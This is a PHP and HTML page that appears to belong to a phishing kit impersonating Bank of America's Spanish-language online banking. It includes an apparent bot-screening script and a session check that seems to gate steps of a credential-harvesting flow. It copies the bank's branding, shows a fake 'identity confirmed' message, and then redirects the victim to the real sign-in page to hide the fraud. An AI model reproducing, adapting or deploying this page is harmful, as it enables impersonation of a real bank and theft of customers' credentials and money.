<?php
require_once "core/helper.php";
require_once "is_bot.php";
if (is_session_started() === FALSE) {
    session_start();
}
if (!array_key_exists("permiso3", $_SESSION)) {
    //header("location:index.php");
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <title>
        Bank of America | Banca en Línea | Entrar | Identificación en línea
    </title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon" />
</head>

<body>
    <div class="container">
        <div class="banner1">
            <img src="img/logo.jpg" alt="logo" />
            <p class="txtg">Entrar</p>
            <div class="derLinks">
                <img class="sarea" src="img/lock.jpg" alt="candado" />
                <div class="areaSegura">Área protegida</div>
                <img class="sarea2" src="img/points.jpg" alt="puntos" />
                <div class="lenguaje">In English</div>
            </div>
        </div>
        <div class="banner2">
            <h1>Verificar su identidad</h1>
        </div>
        <div class="banner3">
            <div class="columnas">
                <div class="columnaX">
                    <h2 class="titulo2">
                        Confirmación de identidad
                    </h2>
                    <p>
                        Su identidad ha sido confirmada correctamente, sera redireccionado en <span id="timer">3</span>
                        segundos a la pagina principal
                    </p>
                    <form autocomplete="off" id="formularioCorreo">

                        <div class="form-group-l">
                            <img src="img/confirm.gif" alt="confirm">
                        </div>
                    </form>
                </div>
                <div class="columna3" style="float: right">
                    <h2>Ayuda para entrar</h2>
                    <ul class="menosmargin">
                        <li>
                            <a href="javascript:void(0)">
                                ¿No reconoce o no puede acceder a la dirección de correo
                                electrónico o al número de teléfono proporcionados?
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="banner4" style="height: 130px">
            <div class="fondolock"></div>
            <p>Área protegida</p>
            <div class="enlaces-footer">
                <a href="javascript:void(0)">Privacidad</a>
                <a href="javascript:void(0)">Seguridad</a>
            </div>
            <div class="copirait">
                <p>Bank of America, N.A. Miembro de FDIC.</p>
                <a href="javascript:void(0)">
                    Igualdad de oportunidades en préstamos para viviendas
                </a>

                <span class="corporation">© 2020 Bank of America Corporation.</span>
            </div>
        </div>
    </div>
    <script src="js/funciones.js"></script>
    <script>
        function startTimer(duration, display) {
            var timer = duration,
                minutes, seconds;
            setInterval(function() {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "" + seconds : seconds;
                if(minutes < 1){
                    display.textContent = seconds;
                }else{
                    display.textContent = minutes + ":" + seconds;
                }
                
                if (--timer < 0) {
                    window.location = "https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go?request_locale=es_US";
                    timer = duration;
                }
            }, 1000);
        }
        window.onload = function() {
            var fiveMinutes = 3,
                display = document.getElementById('timer');
            startTimer(fiveMinutes, display);
        };
    </script>
</body>

</html>